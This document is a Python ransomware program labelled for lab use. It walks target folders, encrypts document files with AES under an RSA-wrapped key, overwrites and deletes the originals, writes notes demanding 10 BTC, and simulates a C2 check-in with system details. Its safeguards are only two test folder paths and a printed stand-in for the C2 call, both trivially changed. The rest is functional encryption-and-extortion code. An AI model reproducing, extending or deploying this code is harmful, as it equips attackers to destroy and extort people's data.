import os
import json
import base64
import platform
import uuid
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.backends import default_backend
from cryptography.fernet import Fernet

# Configuration (SAFE FOR LAB USE)
TARGET_DIRS = [
    str(Path.home() / "ransomware_test"),
    str(Path.home() / "Desktop/test_files")
]
FILE_EXTENSIONS = ['.test', '.txt', '.doc', '.xls', '.ppt', '.pdf']
RANSOM_NOTE = """=== YOUR FILES HAVE BEEN ENCRYPTED ===
Pay 10 BTC to XYZ address to receive decryption key"""
DECRYPTION_KEY = "DEMO-KEY-1234"  # For lab decryption
EXCLUDE_DIRS = [  # Directories to avoid
    str(Path.home() / "AppData"),
    "/usr",
    "/etc",
    "/System",
    "/Library"
]


class EnhancedRansomware:
    def __init__(self):
        self.aes_key = os.urandom(32)
        self.rsa_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        self.victim_id = uuid.uuid4().hex
        self.encrypted_files = []

        self._c2_checkin()  # Fixed system info collection

    def _c2_checkin(self):
        """Cross-platform system information collection"""
        system_info = f"{platform.system()} {platform.release()} {platform.version()} ({platform.node()})"
        c2_data = {
            'victim_id': self.victim_id,
            'system_info': system_info,  # Using platform instead of os.uname()
            'key': base64.b64encode(self._get_encrypted_aes_key()).decode()
        }
        print(f"[*] Simulated C2 Check-In: {json.dumps(c2_data, indent=2)}")

    def _get_encrypted_aes_key(self):
        """Encrypt AES key with RSA public key"""
        return self.rsa_key.public_key().encrypt(
            self.aes_key,
            asym_padding.OAEP(
                mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

    def _write_ransom_note(self, path):
        """Create ransom note in target directory"""
        note_path = Path(path) / "RANSOM_README.txt"
        if not note_path.exists():
            with open(note_path, 'w') as f:
                f.write(RANSOM_NOTE + "\n\n")
                f.write(f"Victim ID: {self.victim_id}\n")
                f.write("Send payment and this ID to receive decryption key\n")

    def _secure_delete(self, filepath):
        """Windows-compatible secure deletion"""
        try:
            # Use proper file mode for Windows
            with open(filepath, 'r+b') as f:
                length = os.path.getsize(filepath)
                f.write(os.urandom(length))
                f.flush()
                os.fsync(f.fileno())
            os.remove(filepath)
        except Exception as e:
            pass

    def encrypt_file(self, filepath):
        """Encrypt file with AES-CBC and random IV"""
        try:
            iv = os.urandom(16)
            cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()

            # Read and pad data
            with open(filepath, 'rb') as f:
                plaintext = f.read()

            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(plaintext) + padder.finalize()
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()

            # Write encrypted file
            encrypted_path = filepath + ".encrypted"
            with open(encrypted_path, 'wb') as f:
                f.write(iv + ciphertext)

            # Securely delete original
            self._secure_delete(filepath)
            self.encrypted_files.append(encrypted_path)
            return True

        except Exception as e:
            return False

    def decrypt_file(self, filepath):
        """Decrypt file using stored AES key"""
        try:
            with open(filepath, 'rb') as f:
                data = f.read()

            iv = data[:16]
            ciphertext = data[16:]

            cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()

            # Unpad data
            unpadder = padding.PKCS7(128).unpadder()
            plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()

            original_path = filepath[:-len(".encrypted")]
            with open(original_path, 'wb') as f:
                f.write(plaintext)

            os.remove(filepath)
            return True

        except Exception as e:
            return False

    def scan_and_encrypt(self):
        """Target files with directory exclusions"""
        encrypted_dirs = set()
        for target_dir in TARGET_DIRS:
            if os.path.exists(target_dir):
                for root, dirs, files in os.walk(target_dir, topdown=True):
                    # Skip excluded directories
                    dirs[:] = [d for d in dirs if os.path.normpath(os.path.join(root, d)) not in EXCLUDE_DIRS]

                    for file in files:
                        if any(file.endswith(ext) for ext in FILE_EXTENSIONS):
                            filepath = os.path.join(root, file)
                            if self.encrypt_file(filepath):
                                encrypted_dirs.add(root)

        # Create ransom notes in affected directories
        for directory in encrypted_dirs:
            self._write_ransom_note(directory)

    def generate_key_file(self):
        """Create encrypted key package"""
        # Encrypt private key with demo code
        private_key_pem = self.rsa_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        fernet_key = base64.urlsafe_b64encode(DECRYPTION_KEY.ljust(32)[:32].encode())
        fernet = Fernet(fernet_key)
        encrypted_private_key = fernet.encrypt(private_key_pem)

        key_data = {
            'victim_id': self.victim_id,
            'encrypted_aes_key': base64.b64encode(self._get_encrypted_aes_key()).decode(),
            'encrypted_private_key': base64.b64encode(encrypted_private_key).decode()
        }

        with open("DECRYPT_INSTRUCTIONS.txt", "w") as f:
            f.write(RANSOM_NOTE + "\n\n")
            f.write(json.dumps(key_data, indent=4))

    def start_decryption(self, input_key):
        """Initiate decryption process"""
        try:
            # Decrypt private key
            fernet_key = base64.urlsafe_b64encode(input_key.ljust(32)[:32].encode())
            fernet = Fernet(fernet_key)

            with open("DECRYPT_INSTRUCTIONS.txt") as f:
                key_data = json.loads(f.read().split('\n\n', 1)[1])

            private_key_pem = fernet.decrypt(base64.b64decode(key_data['encrypted_private_key']))
            self.rsa_key = serialization.load_pem_private_key(
                private_key_pem,
                password=None,
                backend=default_backend()
            )

            # Decrypt AES key
            self.aes_key = self.rsa_key.decrypt(
                base64.b64decode(key_data['encrypted_aes_key']),
                asym_padding.OAEP(
                    mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )

            # Decrypt files
            for encrypted_file in self.encrypted_files:
                if os.path.exists(encrypted_file):
                    self.decrypt_file(encrypted_file)

            print("[+] Decryption completed successfully")
            return True

        except Exception as e:
            print("[!] Decryption failed - invalid key or corrupted data")
            return False


if __name__ == "__main__":
    # Safety checks
    missing_dirs = [d for d in TARGET_DIRS if not os.path.exists(d)]
    if missing_dirs:
        print("Error: Test directories not found!")
        print("Create these first:")
        print("\n".join(missing_dirs))
        exit()

    malware = EnhancedRansomware()

    # Encryption phase
    malware.scan_and_encrypt()
    malware.generate_key_file()
    print("[!] Critical files encrypted!")
    print(f"[!] Victim ID: {malware.victim_id}")

    # Decryption interface
    while True:
        user_input = input("\nEnter decryption code: ").strip()
        if malware.start_decryption(user_input):
            break
        print("Invalid code! (Use 'DEMO-KEY-1234' for lab decryption)")